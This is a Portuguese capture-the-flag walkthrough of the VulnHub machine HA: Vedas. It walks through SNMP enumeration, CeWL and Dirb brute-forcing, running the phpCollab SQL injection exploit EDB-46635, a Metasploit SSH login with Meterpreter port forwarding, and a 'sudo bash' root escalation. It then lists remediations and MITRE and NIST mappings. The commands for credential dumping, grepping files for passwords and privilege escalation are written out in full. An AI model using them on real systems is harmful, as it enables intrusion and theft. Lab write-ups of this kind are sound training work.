# HA: Vedas — Quatro Flags Sagradas, Um Grind Sagrado

Os Vedas são as escrituras mais antigas do Hinduísmo: quatro textos contendo o conhecimento do universo. HA: Vedas espelha essa estrutura perfeitamente. Quatro flags estão escondidas em camadas de serviços, cada uma exigindo uma técnica diferente. O SNMP vaza a primeira. Uma wordlist customizada com CeWL e um exploit público de SQL injection crackeia a segunda. Port forwarding via Meterpreter acessa um serviço interno para a terceira. E um preguiçoso `sudo bash` entrega root e a quarta. Box com design intelectual, sem sombra de dúvida.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | HA: Vedas |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-vedas,376/ |
| **Técnicas** | Enumeração SNMP, CeWL wordlist customizada, Dirb brute-force, SQL injection (EDB-46635), Metasploit Meterpreter, port forwarding, movimento lateral, privesc via sudo bash |
| **CVEs** | CWE-89 (SQL Injection), CWE-269 (Gerenciamento Impróprio de Privilégios), CWE-284 (Divulgação de Informação via SNMP) |
| **Grupos APT** | APT41: explora configurações incorretas de SNMP para reconhecimento lateral em ambientes de telecomunicações; APT34 (OilRig): usa SQL injection em aplicações web para acesso inicial em alvos do Oriente Médio |

---

## Resumo do Ataque

```
netdiscover + nmap (TCP + UDP)
  |
  +--> SNMP (UDP 161) → snmpwalk → Flag 1 (Rig Veda)
  |
  +--> HTTP (80) → CeWL wordlist → Dirb → /phpcollab/ login
          |
          +--> EDB-46635 SQLi → credenciais admin + Flag 2 (Yajur Veda)
          |
          +--> Login SSH (Metasploit) → upgrade para Meterpreter
                    |
                    +--> portfwd → serviço interno → Flag 3 (Sama Veda)
                    |
                    +--> movimento lateral → usuário vedas
                              |
                              +--> sudo bash → root → Flag 4 (Atharva Veda)
```

---

## Metodologia

1. Descoberta de hosts e scan TCP + UDP completo
2. Enumeração SNMP na UDP/161 para Flag 1
3. Geração de wordlist customizada com CeWL a partir da página web
4. Brute-force de diretórios com Dirb usando a wordlist customizada
5. SQL injection via exploit público (EDB-46635) para extrair credenciais e Flag 2
6. Login SSH com Metasploit; upgrade do shell para Meterpreter
7. Port forwarding via Meterpreter para acessar serviço interno e obter Flag 3
8. Movimento lateral para usuário `vedas`; `sudo bash` para root e Flag 4

---

## Passo 1 — Descoberta de Hosts e Scan de Portas

```bash
sudo netdiscover -r 192.168.0.0/24
# Alvo: 192.168.0.163

nmap -sV -sC -p- 192.168.0.163
nmap -sU -sV --top-ports 200 192.168.0.163
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.x
80/tcp  open  http    Apache httpd 2.4.x
161/udp open  snmp    SNMPv2c
```

O scan UDP revela SNMP na porta 161. Isso é uma superfície de reconhecimento enorme. A maioria dos admins deixa o SNMP rodando com a community string padrão `public`.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração SNMP: Flag 1 (Rig Veda)

```bash
snmpwalk -c public -v2c 192.168.0.163
```

Percorra toda a árvore MIB. Entre os valores de OID, uma entrada contém a primeira flag:

```
Flag 1: Rig Veda — {encontrada no output do snmpwalk}
```

**Nota do mundo real:** SNMP v1/v2c envia community strings em texto puro. Milhares de dispositivos corporativos (roteadores, switches, impressoras, no-breaks) ainda rodam SNMP com a string padrão `public`. O APT41 usa enumeração SNMP rotineiramente como parte do reconhecimento inicial de rede em intrusões de telecomunicações.

**MITRE ATT&CK:** T1602.001 — Dados de Repositório de Configuração: SNMP MIB Dump

---

## Passo 3 — Wordlist Customizada e Enumeração Web

Gere uma wordlist a partir da página web do alvo para alimentar o brute-force de diretórios:

```bash
cewl http://192.168.0.163/ -m 3 -w /tmp/vedas_wordlist.txt
wc -l /tmp/vedas_wordlist.txt
```

Execute o Dirb com a lista customizada:

```bash
dirb http://192.168.0.163/ /tmp/vedas_wordlist.txt
```

Descobre `/phpcollab/`, uma aplicação de gerenciamento de projetos rodando phpCollab.

**Alternativa:** `gobuster dir -u http://192.168.0.163/ -w /tmp/vedas_wordlist.txt -x php,html,txt`

**Nota do mundo real:** O CeWL gera wordlists contextuais raspando a terminologia do alvo. Essa técnica é altamente eficaz contra portais customizados onde admins definem senhas relacionadas ao conteúdo da aplicação.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — SQL Injection: Flag 2 (Yajur Veda)

O phpCollab tem uma vulnerabilidade conhecida de SQL injection no formulário de login, documentada no Exploit-DB como EDB-46635:

```bash
searchsploit phpcollab
# Resultado: phpCollab 2.5.1 SQL Injection (EDB-46635)

searchsploit -m 46635
python 46635.py http://192.168.0.163/phpcollab/
```

O exploit dumpa a tabela de usuários, revelando credenciais do admin e a segunda flag embutida em um campo:

```
Flag 2: Yajur Veda — {extraída do banco de dados}
Credenciais: admin:[senha]
```

**Nota do mundo real:** O phpCollab é usado ativamente em gerenciamento de projetos corporativos. O EDB-46635 é uma SQL injection não autenticada: sem credenciais, apenas acesso à rede. Essa classe de vulnerabilidade é consistentemente explorada pelo APT34 para acesso inicial.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1552.001 — Credenciais em Arquivos

---

## Passo 5 — Acesso SSH e Upgrade para Meterpreter

Use o scanner de login SSH do Metasploit com as credenciais extraídas:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.0.163
set USERNAME admin
set PASSWORD [senha_extraida]
run
```

Após o login bem-sucedido, faça upgrade da sessão para Meterpreter:

```bash
sessions -u 1
sessions -i 2
```

O Meterpreter oferece uma sessão estável e rica em recursos com capacidades de port forwarding.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 6 — Port Forwarding: Flag 3 (Sama Veda)

Enumere serviços em escuta no alvo que não estão expostos externamente:

```bash
# No Meterpreter
shell
ss -tlnp
# ou
netstat -tlnp
```

Encontre um serviço interno (por exemplo, na porta 8080 ou outra porta não no output do nmap). Redirecione localmente:

```bash
# No Meterpreter
portfwd add -l 8888 -p [porta_interna] -r 127.0.0.1
```

Acesse `http://127.0.0.1:8888/` na máquina atacante. O serviço interno contém a Flag 3:

```
Flag 3: Sama Veda — {encontrada no serviço web interno}
```

**Nota do mundo real:** Port forwarding via Meterpreter é um dos primitivos de movimento lateral mais poderosos. Atacantes usam isso para alcançar bancos de dados, painéis admin e APIs internas acessíveis apenas via localhost.

**MITRE ATT&CK:** T1090 — Proxy

---

## Passo 7 — Movimento Lateral e Root: Flag 4 (Atharva Veda)

Enumere usuários no sistema:

```bash
cat /etc/passwd | grep -v nologin | grep -v false
# Nota: usuário vedas existe

find / -name "*.conf" -o -name "*.php" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

Mude para o usuário `vedas` (credenciais encontradas na config da aplicação ou no dump do banco) e verifique o sudo:

```bash
su vedas
sudo -l
# (ALL : ALL) NOPASSWD: /bin/bash

sudo bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag4.txt
# Flag 4: Atharva Veda — ROOT
```

ᕕ( ᐛ )ᕗ Os quatro Vedas coletados. Missão cumprida, rapaziada!

**Nota do mundo real:** `sudo bash` com NOPASSWD é a configuração incorreta de sudo mais trivialmente explorada. É funcionalmente equivalente a dar ao usuário acesso root sem senha. Essa misconfiguration aparece constantemente em sistemas Linux que não foram endurecidos após a instalação inicial.

**MITRE ATT&CK:** T1548.003 — Mecanismo de Controle de Elevação: Sudo; T1078.001 — Contas Válidas

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Método |
|---|---|---|---|
| Flag 1 (Rig Veda) | (valor OID SNMP) | SNMP UDP/161 | snmpwalk |
| Flag 2 (Yajur Veda) | (campo do BD) | Banco phpCollab | EDB-46635 SQLi |
| Credenciais | admin:[senha] | Tabela de usuários phpCollab | EDB-46635 SQLi |
| Flag 3 (Sama Veda) | (serviço interno) | Porta interna localhost | Meterpreter portfwd |
| Flag 4 (Atharva Veda) | (flag root) | /root/ | sudo bash |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | Community string SNMP padrão `public` | Milhões de dispositivos corporativos expõem SNMP com strings padrão | Desabilite SNMP v1/v2c; use SNMPv3 com autenticação; bloqueie UDP/161 |
| 2 | phpCollab SQL injection não autenticada (EDB-46635) | Ferramentas CMS/projeto não corrigidas em intranets são exploradas consistentemente | Faça patch e inventarie todas as aplicações web internas |
| 3 | Serviço interno apenas em localhost, acessível via tunelamento | Um atacante com qualquer acesso shell pode alcançar todos os serviços localhost | Defesa em profundidade: criptografe e autentique todos os serviços internos |
| 4 | `sudo bash` NOPASSWD | Maior descoberta única de privesc em Linux; concede root imediato | Audite sudoers em todos os hosts; remova NOPASSWD para shells |
| 5 | Reutilização de credenciais do banco para SSH | Credenciais extraídas funcionaram para movimento lateral | Senhas únicas por serviço; sem reutilização entre BD da app e contas do SO |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Coleta | Dados de Repositório de Configuração: SNMP | T1602.001 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Comando e Controle | C2 | Proxy | T1090 |
| Escalação de Privilégios | Escalação de Privilégios | Mecanismo de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilite SNMP v1/v2c**: migre para SNMPv3 com nível de segurança `authPriv`; bloqueie UDP/161 em firewall
2. **Faça patch do phpCollab**: atualize para versão suportada; aplique mitigação do EDB-46635
3. **Criptografe serviços internos**: mesmo serviços localhost devem exigir autenticação; use TLS e API keys
4. **Remova sudo NOPASSWD para shells**: exija senhas para todo sudo, especialmente `bash`, `sh`, `python`
5. **Isole credenciais**: senhas do banco de dados da aplicação nunca devem coincidir com senhas de usuários do SO

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os dispositivos com SNMP; auditar aplicações web internas |
| Proteger | Controle de Acesso | Desabilitar community strings SNMP padrão; restringir sudo a comandos específicos |
| Proteger | Segurança de Dados | Criptografar credenciais em trânsito; senhas únicas por serviço |
| Detectar | Anomalias e Eventos | Alertar em tentativas de SNMP mass-walk; conexões anômalas de port forwarding |
| Responder | Planejamento de Resposta | Fazer patch do phpCollab; rotacionar credenciais extraídas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| CM-6 | Configurações | Desabilitar community strings SNMP padrão |
| CM-7 | Funcionalidade Mínima | Desabilitar serviços não utilizados; restringir sudo |
| IA-5 | Gestão de Autenticadores | Credenciais únicas por serviço; rotacionar após comprometimento |
| SC-7 | Proteção de Fronteiras | Bloquear serviços internos; restringir SNMP a VLANs de gerenciamento |
| SI-2 | Remediação de Falhas | Fazer patch do phpCollab; aplicar mitigações de exploits públicos |

---

## Considerações Finais

HA: Vedas é uma box multi-flag sensacional que te força a pensar diferente em cada etapa. SNMP, SQLi, port forwarding, movimento lateral: quatro habilidades distintas, quatro flags sagradas. O tema dos Vedas é inteligente porque a máquina realmente contém "conhecimento em camadas": cada serviço esconde a chave para o próximo.

O truque da wordlist CeWL é a parte mais educativa. Gerar uma lista customizada a partir do próprio alvo e depois descobrir o CMS com ela é uma técnica que paga dividendos em engajamentos reais onde wordlists padrão falham, mano.

Grande respeito ao criador da série HA por entregar consistentemente boxes temáticos com profundidade metodológica real.

Thanks guys!! (❍ᴥ❍ʋ)
